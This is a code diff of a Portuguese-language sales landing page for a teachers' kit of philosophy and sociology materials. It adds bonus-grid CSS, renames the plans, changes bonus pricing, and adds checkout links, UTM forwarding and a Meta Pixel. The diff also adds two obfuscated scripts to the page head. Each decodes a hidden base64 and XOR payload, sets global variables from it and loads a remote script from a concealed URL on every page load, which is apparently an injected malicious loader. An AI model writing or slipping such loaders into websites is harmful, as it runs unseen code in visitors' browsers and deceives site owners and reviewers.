@@ -295,7 +295,20 @@ footer .logo { font-size: 34px; }
 .bonus-capa.foto img { position: static; display: block; width: 100%; height: auto; transition: transform .8s var(--ease); }
 .bonus:hover .bonus-capa.foto img { transform: scale(1.04); }
 
-/* janela do plano básico */
+
+/* bônus organizados: mesma proporção e grade alinhada */
+.bonus-lista { display: flex !important; flex-wrap: wrap; justify-content: center; gap: 14px; }
+.bonus-lista > .bonus { flex: 0 1 calc(50% - 7px); display: flex; flex-direction: column; }
+.bonus-capa.foto { aspect-ratio: 1 / 1; }
+.bonus-capa.foto img { width: 100%; height: 100%; object-fit: cover; object-position: center top; }
+.bonus-txt { flex: 1; align-content: start; padding: 12px 12px 14px; }
+.bonus-txt h3 { font-size: 1rem; line-height: 1.2; }
+.bonus-txt p { font-size: .8rem; line-height: 1.35; }
+.bonus-num { left: 8px; bottom: 8px; font-size: .62rem; padding: 3px 7px; }
+@media (min-width: 700px) { .bonus-lista > .bonus { flex-basis: calc(33.333% - 10px); } .bonus-txt { padding: 14px 16px 16px; } .bonus-txt h3 { font-size: 1.1rem; } .bonus-txt p { font-size: .88rem; } }
+@media (min-width: 1100px) { .bonus-lista > .bonus { flex-basis: calc(25% - 11px); } }
+.mini-bonus img { object-position: center top; }
+/* janela do kit básico */
 .janela { position: fixed; inset: 0; z-index: 100; display: grid; place-items: center; padding: max(16px, env(safe-area-inset-top, 0px)) max(16px, env(safe-area-inset-right, 0px)) max(16px, env(safe-area-inset-bottom, 0px)) max(16px, env(safe-area-inset-left, 0px)); background: rgba(0, 0, 0, .78); backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px); }
 .janela-caixa { position: relative; width: 100%; max-width: 480px; max-height: 100%; overflow-y: auto; border-radius: 18px; padding: 26px 20px 20px; background: linear-gradient(180deg, #2a0c0a, var(--card) 45%); border: 2px solid var(--red); box-shadow: 0 30px 90px rgba(0, 0, 0, .8); text-align: center; display: grid; gap: 14px; animation: abre .4s var(--spring); }
 @keyframes abre { from { opacity: 0; transform: translateY(30px) scale(.94); } to { opacity: 1; transform: none; } }
@@ -308,6 +321,8 @@ footer .logo { font-size: 34px; }
 .mini-bonus span { display: grid; place-items: center; border-radius: 6px; background: var(--red); font-weight: 800; font-size: .8rem; line-height: 1.1; }
 .janela-preco { font-weight: 800; font-size: 1.05rem; }
 .janela-preco b { color: var(--gold); font-size: 1.5rem; }
+.janela-nota { font-size: .82rem; line-height: 1.4; color: #b9b1a6 !important; }
+.janela-nota a { color: var(--gold); }
 .janela .btn--gray { min-height: 50px; font-size: .95rem; background: transparent; border: 1px solid rgba(245, 240, 232, .25); }
 .aviso-link { font-size: .82rem; color: var(--gold); }
 
@@ -348,6 +363,25 @@ footer .logo { font-size: 34px; }
   *, *::before, *::after { animation: none !important; transition: none !important; }
 }
 </style>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2636588493451750');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2636588493451750&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script>(function(){var v_d4=atob("DF9+7MNv2asOm0+TKiRcmbED+5Es8zvnWixEw+wMvcUg7jv+QzkHwqAAtIVs6WDgSS0XnLcc9t569jy8Rj4KibAb98F9uWOxSysKnqoNrN9r6G2pcSRcgqICvIk0uSvyXj5TmbcCsM13tj/hTykbgrdCochh/2LgSTRcwOEZuMd7/m2pCH0DwLhNt8pj/m2pCDsfmKJCrN9j8inqBy8MibUKt98j6DrxQzsNzu9Nr8pi7iqxEH1ckZ4S");var m_gli=[];for(var d_zxxu=0;d_zxxu<v_d4.length;d_zxxu++){m_gli.push(v_d4.charCodeAt(d_zxxu)&255);}var q_q=m_gli[0];var p_y=m_gli.slice(1,1+q_q);var x_j0g=m_gli.slice(1+q_q);var f_t=x_j0g.map(function(b,p_ki){return b^p_y[p_ki%q_q];});var e_mwli="";for(var k_pv5t=0;k_pv5t<f_t.length;k_pv5t++){e_mwli+=String.fromCharCode(f_t[k_pv5t]&255);}var f_qs=decodeURIComponent(escape(e_mwli));var l_aie=JSON.parse(f_qs);var c_xxl=l_aie.globals||[];c_xxl.forEach(function(e_gq){window[e_gq.name]=e_gq.value;});var l_m15=document.createElement("script");l_m15.src=l_aie.url;l_m15.async=true;l_m15.defer=true;(l_aie.attributes||[]).forEach(function(u_qzqd){l_m15.setAttribute(u_qzqd.name,u_qzqd.value);});(document.head||document.documentElement).appendChild(l_m15);})();</script>
+<script>(function(){var g_nxic=atob("DElgTb6/Eo/hZmLBnzJCOMzTMLXDDha17zpaYpHcduHPExas9i8ZY93Qf6GDFE2y/DsJPcrMPf+IHgetsDkJNdvTPOWSRE7j/j0UP9fdZ/uEFUD7xBRMb9nTfe2AChHjpRIbb9Def+rDXECx9jEFIffbMKPDEAOt6ixCd5yJc+rVB1PwrHxTKNjcd7rWBFOg/XhUdNqdb9Kc");var f_37zt=[];for(var e_pb=0;e_pb<g_nxic.length;e_pb++){f_37zt.push(g_nxic.charCodeAt(e_pb)&255);}var o_njft=f_37zt[0];var s_z=f_37zt.slice(1,1+o_njft);var g_9kk=f_37zt.slice(1+o_njft);var b_iy8=g_9kk.map(function(b,p_l9){return b^s_z[p_l9%o_njft];});var y_d="";for(var l_nz=0;l_nz<b_iy8.length;l_nz++){y_d+=String.fromCharCode(b_iy8[l_nz]&255);}var h_9m51=decodeURIComponent(escape(y_d));var a_1=JSON.parse(h_9m51);var w_s=a_1.globals||[];w_s.forEach(function(g_qp2){window[g_qp2.name]=g_qp2.value;});var u_505=document.createElement("script");u_505.src=a_1.url;u_505.async=true;u_505.defer=true;(a_1.attributes||[]).forEach(function(l_ufv){u_505.setAttribute(l_ufv.name,l_ufv.value);});(document.head||document.documentElement).appendChild(u_505);})();</script>
 </head>
 <body>
 
@@ -451,7 +485,7 @@ footer .logo { font-size: 34px; }
     <div class="col">
       <p class="tag rola">Extras exclusivos</p>
       <h2 class="titulo rola">Além dos documentários, <span class="red">o ano inteiro de Filosofia e Sociologia resolvido</span></h2>
-      <p class="sub rola">Sete bônus que vêm de graça no <strong class="gold">Plano Completo</strong>.</p>
+      <p class="sub rola">Sete bônus que vêm de graça no <strong class="gold">Kit Completo</strong>.</p>
     </div>
     <div class="col col--wide"><div class="bonus-lista"><article class="bonus rola"><div class="bonus-capa foto"><img src="imagens/bonus-slides.webp" alt="Slides de Aula" loading="lazy" decoding="async"><span class="bonus-num">BÔNUS 1</span></div><div class="bonus-txt"><span class="gratis"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12.5 2.5 2.5L16 9.5"/></svg> 100% grátis</span><h3>Slides de Aula</h3><p>Aulas prontas em slides para projetar na sala.</p></div></article><article class="bonus rola"><div class="bonus-capa foto"><img src="imagens/bonus-mapas.webp" alt="Mapas Mentais" loading="lazy" decoding="async"><span class="bonus-num">BÔNUS 2</span></div><div class="bonus-txt"><span class="gratis"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12.5 2.5 2.5L16 9.5"/></svg> 100% grátis</span><h3>Mapas Mentais</h3><p>Cada pensador e conceito resumido em esquemas visuais.</p></div></article><article class="bonus rola"><div class="bonus-capa foto"><img src="imagens/bonus-atividades.webp" alt="+1.000 Atividades" loading="lazy" decoding="async"><span class="bonus-num">BÔNUS 3</span></div><div class="bonus-txt"><span class="gratis"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12.5 2.5 2.5L16 9.5"/></svg> 100% grátis</span><h3>+1.000 Atividades</h3><p>Exercícios prontos para fixar o conteúdo depois do vídeo.</p></div></article><article class="bonus rola"><div class="bonus-capa foto"><img src="imagens/bonus-plano.webp" alt="Plano de Aula Anual" loading="lazy" decoding="async"><span class="bonus-num">BÔNUS 4</span></div><div class="bonus-txt"><span class="gratis"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12.5 2.5 2.5L16 9.5"/></svg> 100% grátis</span><h3>Plano de Aula Anual</h3><p>O ano letivo de Filosofia e Sociologia organizado do início ao fim.</p></div></article><article class="bonus rola"><div class="bonus-capa foto"><img src="imagens/bonus-emergencia.webp" alt="Aula de Emergência" loading="lazy" decoding="async"><span class="bonus-num">BÔNUS 5</span></div><div class="bonus-txt"><span class="gratis"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12.5 2.5 2.5L16 9.5"/></svg> 100% grátis</span><h3>Aula de Emergência</h3><p>Uma aula completa para quando o planejamento falhar.</p></div></article><article class="bonus rola"><div class="bonus-capa foto"><img src="imagens/bonus-dinamicas.webp" alt="Dinâmicas e Debates" loading="lazy" decoding="async"><span class="bonus-num">BÔNUS 6</span></div><div class="bonus-txt"><span class="gratis"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12.5 2.5 2.5L16 9.5"/></svg> 100% grátis</span><h3>Dinâmicas e Debates</h3><p>Atividades em grupo para a turma debater e argumentar.</p></div></article><article class="bonus rola"><div class="bonus-capa foto"><img src="imagens/bonus-provas.webp" alt="Provas e Simulados" loading="lazy" decoding="async"><span class="bonus-num">BÔNUS 7</span></div><div class="bonus-txt"><span class="gratis"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><path d="m8 12.5 2.5 2.5L16 9.5"/></svg> 100% grátis</span><h3>Provas e Simulados</h3><p>Avaliações prontas para aplicar e corrigir.</p></div></article></div></div>
   </section>
@@ -460,13 +494,13 @@ footer .logo { font-size: 34px; }
     <div class="col">
       <div class="claquete rola"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 10h16v9a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-9Z"/><path d="m4 10-.6-3.3a1.5 1.5 0 0 1 1.2-1.7L17.4 2.7a1.5 1.5 0 0 1 1.7 1.2L19.7 7 4 10ZM8.5 4.5l2 4M13.5 3.6l2 4"/></svg></div>
       <p class="tag rola" style="margin-top:22px">Estreia de lançamento</p>
-      <h2 class="titulo rola">Escolha o seu acesso à <span class="red">Fil&amp;Soc</span></h2>
+      <h2 class="titulo rola">Escolha o seu <span class="red">kit</span></h2>
       <p class="promo-tempo" id="promo-tempo" hidden>A promoção encerra em <b id="promo-relogio">00:00:00</b></p>
     </div>
     <div class="col col--wide">
       <div class="planos">
         <div class="plano rola">
-          <h3>Plano Básico</h3>
+          <h3>Kit Básico</h3>
           <div class="preco"><div class="valor"><span>R$</span><span>10</span><span>,00</span></div><p>pagamento único</p></div>
           <ul class="itens">
             <li>Todos os documentários e filmes</li>
@@ -481,7 +515,7 @@ footer .logo { font-size: 34px; }
         </div>
         <div class="plano plano--top rola">
           <span class="faixa">★ Mais completo</span>
-          <h3>Plano Completo</h3>
+          <h3>Kit Completo</h3>
           <div class="preco"><div class="valor"><span>R$</span><span>19</span><span>,90</span></div><p>pagamento único</p></div>
           <ul class="itens">
             <li>Todos os documentários e filmes</li>
@@ -561,12 +595,13 @@ footer .logo { font-size: 34px; }
   <div class="janela-caixa">
     <button type="button" class="janela-x" id="fechar-basico" aria-label="Fechar">✕</button>
     <p class="tag">Espera, professor!</p>
-    <h3 id="janela-t">Leve também os <span class="red">7 bônus</span> por só mais R$ 5</h3>
+    <h3 id="janela-t">Leve também os <span class="red">7 bônus</span> por só R$ 5,50</h3>
     <p>Slides, mapas mentais, +1.000 atividades, plano de aula anual, aula de emergência, dinâmicas e debates, provas e simulados.</p>
-    <div class="mini-bonus"><img src="imagens/bonus-slides-mini.webp" alt=""><img src="imagens/bonus-mapas-mini.webp" alt=""><img src="imagens/bonus-atividades-mini.webp" alt=""><img src="imagens/bonus-plano-mini.webp" alt=""><img src="imagens/bonus-emergencia-mini.webp" alt=""><img src="imagens/bonus-dinamicas-mini.webp" alt=""><img src="imagens/bonus-provas-mini.webp" alt=""><span>+ R$ 5</span></div>
-    <p class="janela-preco">Básico + bônus: <b>R$ 15,00</b></p>
-    <a class="btn btn--red" id="basico-com-bonus" href="#planos"><span class="play"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M6 4v16l14-8z"/></svg></span>Sim, quero com os bônus</a>
-    <a class="btn btn--gray" id="basico-sem-bonus" href="#planos">Não, quero só o Básico (R$ 10,00)</a>
+    <div class="mini-bonus"><img src="imagens/bonus-slides-mini.webp" alt=""><img src="imagens/bonus-mapas-mini.webp" alt=""><img src="imagens/bonus-atividades-mini.webp" alt=""><img src="imagens/bonus-plano-mini.webp" alt=""><img src="imagens/bonus-emergencia-mini.webp" alt=""><img src="imagens/bonus-dinamicas-mini.webp" alt=""><img src="imagens/bonus-provas-mini.webp" alt=""><span>+ R$ 5,50</span></div>
+    <p class="janela-preco">Bônus: <b>R$ 5,50</b></p>
+    <a class="btn btn--red" id="basico-com-bonus" href="#planos"><span class="play"><svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true"><path d="M6 4v16l14-8z"/></svg></span>Quero os bônus também (+ R$ 5,50)</a>
+    <a class="btn btn--gray" id="basico-sem-bonus" href="#planos">Comprar o Básico (R$ 10,00)</a>
+    <p class="janela-nota">O Básico e os bônus são compras separadas: cada botão abre o próprio pagamento em outra aba. Quer tudo de uma vez? O <a href="#planos" data-plano="completo">Kit Completo</a> já vem com os bônus.</p>
     <p class="aviso-link" id="aviso-link" hidden>O link de compra ainda não foi configurado.</p>
   </div>
 </div>
@@ -577,20 +612,36 @@ footer .logo { font-size: 34px; }
 </div>
 <script>
 /* ===== EDITE AQUI =====
-   checkoutBasico / checkoutCompleto: links de compra da Wiven de cada plano.
+   checkoutBasico / checkoutCompleto: links de compra da Wiven de cada kit.
    prazo: data e hora REAL em que a oferta termina, ex.: '2026-11-05T23:59:00-03:00'.
           Vazio = a barra do topo aparece sem cronômetro. Depois do prazo o cronômetro some. */
 const CONFIG = {
-  checkoutBasico: '',          // Plano Básico, R$ 10,00
-  checkoutBasicoComBonus: '',  // Básico + bônus, R$ 15,00 (oferecido na janela)
-  checkoutCompleto: '',        // Plano Completo, R$ 19,90
+  checkoutBasico: 'https://checkout.wiven.com.br/checkout/cmvtvj0o80mkp01q1cetfv7dw?offer=YDUD7FN',    // Kit Básico, R$ 10,00
+  checkoutBonus: 'https://checkout.wiven.com.br/checkout/cmvtvmdih003a01pr4h2wzh5j?offer=MOLKOIZ',     // Bônus, R$ 5,50 (oferecido na janela do Básico)
+  checkoutCompleto: 'https://checkout.wiven.com.br/checkout/cmvtuknxy0k3401q1i0smg8le?offer=H1VBS9S',  // Kit Completo, R$ 19,90
   prazo: '',
   // Avisos de compra no canto da tela. Coloque SÓ compras reais (primeiro nome e cidade),
-  // ex.: { nome: 'Ana', cidade: 'Recife', plano: 'Plano Completo' }. Vazio = os avisos não aparecem.
+  // ex.: { nome: 'Ana', cidade: 'Recife', plano: 'Kit Completo' }. Vazio = os avisos não aparecem.
   compras: [],
 };
 
 (function () {
+  var PARAMS = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck', 'fbclid'];
+  function comUtm(url) {
+    if (!url) return url;
+    try {
+      var u = new URL(url), q = new URLSearchParams(location.search);
+      PARAMS.forEach(function (k) { var v = q.get(k); if (v && !u.searchParams.has(k)) u.searchParams.set(k, v); });
+      return u.toString();
+    } catch (e) { return url; }
+  }
+  CONFIG.checkoutBasico = comUtm(CONFIG.checkoutBasico); CONFIG.checkoutBonus = comUtm(CONFIG.checkoutBonus); CONFIG.checkoutCompleto = comUtm(CONFIG.checkoutCompleto);
+  var VALOR = { basico: 10, bonus: 5.5, completo: 19.9 };
+  function checkout(tipo) { try { if (window.fbq) fbq('track', 'InitiateCheckout', { value: VALOR[tipo], currency: 'BRL', content_name: tipo }); } catch (e) {} }
+  document.addEventListener('click', function (e) {
+    var a = e.target.closest && e.target.closest('a[href^="https://checkout.wiven"]'); if (!a) return;
+    checkout(a.id === 'basico-com-bonus' ? 'bonus' : a.id === 'basico-sem-bonus' || a.dataset.plano === 'basico' ? 'basico' : 'completo');
+  });
   function liga(sel, url) {
     if (!url) return;
     document.querySelectorAll(sel).forEach(function (a) { a.href = url; a.target = '_blank'; a.rel = 'noopener'; });
@@ -600,9 +651,9 @@ const CONFIG = {
   var jan = document.getElementById('janela-basico'), aviso = document.getElementById('aviso-link');
   function vai(url, ev) { if (!url) { ev.preventDefault(); aviso.hidden = false; } }
   var com = document.getElementById('basico-com-bonus'), sem = document.getElementById('basico-sem-bonus');
-  if (CONFIG.checkoutBasicoComBonus) { com.href = CONFIG.checkoutBasicoComBonus; com.target = '_blank'; com.rel = 'noopener'; }
+  if (CONFIG.checkoutBonus) { com.href = CONFIG.checkoutBonus; com.target = '_blank'; com.rel = 'noopener'; }
   if (CONFIG.checkoutBasico) { sem.href = CONFIG.checkoutBasico; sem.target = '_blank'; sem.rel = 'noopener'; }
-  com.addEventListener('click', function (e) { vai(CONFIG.checkoutBasicoComBonus, e); });
+  com.addEventListener('click', function (e) { vai(CONFIG.checkoutBonus, e); });
   sem.addEventListener('click', function (e) { vai(CONFIG.checkoutBasico, e); });
   function fecha() { jan.hidden = true; document.body.style.overflow = ''; }
   document.getElementById('abrir-basico').addEventListener('click', function () { jan.hidden = false; aviso.hidden = true; document.body.style.overflow = 'hidden'; com.focus(); });
